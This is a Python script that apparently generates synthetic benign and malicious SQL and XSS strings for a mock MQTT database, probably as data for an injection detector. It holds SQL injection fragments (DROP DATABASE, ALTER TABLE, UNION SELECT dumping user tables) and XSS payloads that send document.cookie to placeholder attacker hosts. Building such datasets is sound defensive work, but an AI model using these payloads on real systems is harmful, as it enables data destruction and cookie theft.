import random
import time


def generateQuery():
    # Query Templates
    # SELECT [data] FROM Topics [join statement 1] [join statement 2] WHERE [condition] [operator] [condition]
    # INSERT INTO Topics (topic_name, publisherID) VALUES ([topic_name], [publisherID])
    # INSERT INTO data_points (dp_value, value_unit, requestID) VALUES ([dp_value], [value_unit], [requestID])
    # INSERT INTO Requests (topicId, subscriberID) VALUES ([topicID], [subscriberID])

    topics_list = ['"house3/livingroom/temp"', '"house1/proximity"', '"car1/speed"', '"car3/proximity"', '"house2/room1/temp"',
                   '"car2/speed"', '"house3/proximity"', '"house1/bedroom1/temp"', '"car3/speed"', '"house1/livingroom/temp"']

    select_stmt_params = [['*', 'topic_string', 'dp_value', 'value_unit', 'post_time'],
                          ['subscriberID = ' + str(random.choice(list(range(1, 10)))),
                           'publisherID = ' + str(random.choice(list(range(1, 10)))),
                           'topic_string = ' + random.choice(topics_list)],
                          ['AND', 'OR']]

    requests_join = "JOIN Requests ON Topics.topic_id = Requests.topicID"
    dp_join = "JOIN data_points ON Requests.request_id = data_points.requestID"
    delimiter = ", "

    tf_remixed = random.sample(select_stmt_params[0], len(select_stmt_params[0]))
    field_data = tf_remixed[0:random.choice(range(1, 4))]
    operation = random.choice(select_stmt_params[2])
    condition1 = random.choice(select_stmt_params[1])
    condition2 = " " + operation + " " + random.choice(select_stmt_params[1])

    if '*' == field_data[0]:
        table_field = '*'
    elif '*' in field_data:
        field_data.remove('*')
        table_field = delimiter.join(field_data)
    else:
        table_field = delimiter.join(field_data)
    if condition1 == condition2:
        condition2 = ''

    select_query_structure = "SELECT " + table_field + " FROM Topics " + requests_join + " " + dp_join + " WHERE " + \
                             condition1 + condition2
    # print(select_query_structure)

    topics = ['"house1/bedroom1/temp"', '"house2/proximity"', '"house3/basement/temp"', '"truck1/speed"', '"truck2/speed"',
              '"house1/humidity"', '"house2/bedroom2/temp"', '"car1/proximity"', '"car2/proximity"', '"car3/humidity"',
              '"house1/basement/humidity"', '"house2/humidity"']
    pub_id = str(random.choice(list(range(1, 10))))
    topic_insert_structure = "INSERT INTO Topics (topic_string, publisherID) VALUES (" + random.choice(
        topics) + ", " + pub_id + ")"
    # print(topic_insert_structure)

    dp_value = random.choice([x * random.choice([x * 0.1 for x in range(1, 10)]) for x in range(1, 100)])
    value_unit = random.choice(['"°C"', '"m"', '"m/s"', '"ft"', '"%"'])
    req_id = str(random.choice(list(range(1, 10))))
    dp_insert_structure = "INSERT INTO data_points (dp_value, value_unit, requestID) VALUES (" + \
                          str(round(dp_value, 1)) + ", " + value_unit + ", " + str(req_id) + ")"
    # print(dp_insert_structure)
    t_id = str(random.choice(list(range(1, 10))))
    sub_id = str(random.choice(list(range(1, 10))))
    reqs_insert_structure = "INSERT INTO Requests (topicID, subscriberID) VALUES (" + t_id + ", " + sub_id + ")"
    # print(reqs_insert_structure)

    mal_query_params = [['DROP', 'ALTER', 'UNION', 'UNION ALL'],
                        ['TABLE', 'DATABASE'],
                        ['SELECT subscriber_id, subscriber_name, NULL AS sub_id FROM Subscribers',
                         'SELECT publisher_id, publisher_name, NULL AS pub_id FROM Publishers',
                        ],
                        ['Subscribers', 'Publishers', 'Topics', 'Requests', 'data_points'],
                        ['ADD COLUMN', 'DROP COLUMN', 'ALTER COLUMN', 'MODIFY COLUMN'],
                        ['injected_column1', 'injected_column2', 'injected_column3']]

    action = random.choice(mal_query_params[0])
    tables = random.choice(mal_query_params[3])
    alter_element = random.choice(mal_query_params[4])
    database_name = "mqtt_mock_db"
    use = "USE " + database_name + ";"
    mal_query = ''
    if action == 'DROP':
        db_target = random.choice(mal_query_params[1])
        if db_target == "DATABASE":
            mal_query = "; " + use + " " + action + " " + db_target + " " + database_name
        else:
            mal_query = "; " + action + " " + db_target + " " + tables

    elif action == 'ALTER':
        db_target = random.choice(mal_query_params[1])
        if db_target == "DATABASE":
            mal_query = use + " " + action + " " + db_target + " " + database_name
        else:
            if "ADD" in alter_element:
                column_name = random.choice(mal_query_params[5])
                mal_query = action + " " + db_target + " " + tables + " " + alter_element + " " + column_name
            else:
                if tables == "Subscribers":
                    column_name = "subscriber_name"
                    mal_query = action + " " + db_target + " " + tables + " " + alter_element + " " + column_name
                elif tables == "Publishers":
                    column_name = "publisher_name"
                    mal_query = action + " " + db_target + " " + tables + " " + alter_element + " " + column_name
                else:
                    pass

    elif action == 'UNION' or action == 'UNION ALL':
        selects = random.sample(mal_query_params[2], len(mal_query_params[2]))
        mal_query = action + " " + random.choice(selects)

    else:
        pass

    malicious_query_structure = mal_query
    # print(malicious_query_structure)
    all_inserts = random.choice([topic_insert_structure, dp_insert_structure, reqs_insert_structure])
    # print(all_inserts)
    benign_sql = random.choice([select_query_structure, all_inserts])
    # print(benign_sql)
    if 'INSERT' in benign_sql and 'UNION' in malicious_query_structure:
        pass
    elif 'SELECT' in benign_sql and 'UNION' in malicious_query_structure:
        sql_injection = benign_sql + " " + malicious_query_structure
        # print(sql_injection)
        # print(random.choice([benign_sql, sql_injection]))
        return random.choice([benign_sql, sql_injection]) + ";"
    elif 'INSERT' in benign_sql and 'TABLE' in malicious_query_structure:
        pass
    elif ';' == malicious_query_structure:
        pass
    else:
        benign_sql = random.choice([select_query_structure, all_inserts])
        sql_injection = benign_sql + " " + malicious_query_structure
        # print(sql_injection)
        # print(random.choice([benign_sql, sql_injection]))

        return random.choice([benign_sql, sql_injection]) + ";"

    # return select_query_structure  # Uncomment to run select statements only
    # return topic_insert_structure  # Uncomment to run topic insert statements only
    # return dp_insert_structure  # Uncomment to run data point insert statements only
    # return reqs_insert_structure  # Uncomment to run request insert statements only


def generateXSS():
    # all XSS made is used to simulate key components found in real xss
    # this dat is not executed in the system

    global armed_xss_js, xss_script
    global malicious_xss_script, benign_xss_script, generated_script
    xss_generation_dataset = [['<script>...</script>', '<a href="..."></a>', '<body _></body>', '<div _></div>', '<b _></b>', '<img _>'],  # html
                              ['src=javascript:', 'src="-"', 'onmouseover=', 'onload=', 'onerror=', 'onblur=', 'oncut='],  # html attribute
                              ['alert(#)', 'prompt(#)', 'String.fromCharCode(88,83,83, 65,116,116,97,99,107)'],  # javascript
                              ['var attack="passwords.php?cookie_data="+escape({});', 'var+img=new+Image();img.src="http://hacked/"%20+%20document.cookie;'],  # javascript with var
                              ['"XSS"', 'document.cookie', 'http://mysite/?var=<SCRIPT%20a=">"%20SRC="http://attacker/xss.js"></SCRIPT>',
                               'http://127.0.0.1:5000', 'http://stealyourcookies.com', 'http://execute-attack/xss.js', 'http://xss/launch.php'],
                              ['function MQTTHandle(client, keepalive) {this.client = client; this.isConnected = false; this.nextPacketId = 0; this.storage = {}; this.storageCount = 0; native.MqttInit(this);}',
                               'function EventEmitter() {this._events = {};}',
                               'function ServerResponse(req){OutgoingMessage.call(this); if (req.method === "HEAD") this._hasBody = false;}',
                               'function SocketState(options) {this.connecting = false; this.connected = false; this.writable = true; this.readable = true; this.destroyed = false;}',
                               'function Socket(options) {if (!(this instanceof Socket)) {return new Socket(options);} if (options === undefined) {options = {};} this._socketState = new SocketState(options); this.on("finish", onSocketFinish); this.on("end", onSocketEnd);}']]  # attack

    html = random.choice(xss_generation_dataset[0])
    attribute = random.choice(xss_generation_dataset[1])
    js_functions = random.choice(xss_generation_dataset[2])
    var_js = random.choice(xss_generation_dataset[3])
    payload = xss_generation_dataset[4]
    benign_xss = random.choice(xss_generation_dataset[5][0:])

    if "#" in js_functions:
        armed_xss_js = js_functions.replace("#", random.choice(payload[0:2]))
    elif "{}" in var_js:
        armed_xss_js = var_js.replace("{}", random.choice(payload[0:2]))
    else:
        armed_xss_js = ''

    if "..." in html and not armed_xss_js == '':
        malicious_xss_script = html.replace("...", armed_xss_js)
        #print(malicious_xss_script)
        benign_xss_script = html.replace("...", benign_xss)
        # print(benign_xss_script)
        generated_script = random.choice([malicious_xss_script, benign_xss_script])
        # print(generated_script)
    elif "_" in html:
        if "-" in attribute:
            armed_src = attribute.replace("-", random.choice(payload[3:]))
            malicious_xss_script = html.replace("_", armed_src)
            # print(malicious_xss_script)
            generated_script = malicious_xss_script
            # print(generated_script)
        elif not armed_xss_js == '':
            malicious_xss_script = html.replace("_", attribute + armed_xss_js)
            # print(malicious_xss_script)
            generated_script = malicious_xss_script
            # print(generated_script)
        else:
            generated_script = ''
    else:
        pass

    if generated_script == '':
        generated_script = None
        pass
    else:
        # print(generated_script)
        return generated_script


# running main function produces randomly generated content from both functions
# comment out as necessary
if __name__ == '__main__':
    while True:
        # generateQuery()
        # generateXSS()
        print(random.choice([generateQuery(), generateXSS()]))
        time.sleep(1)
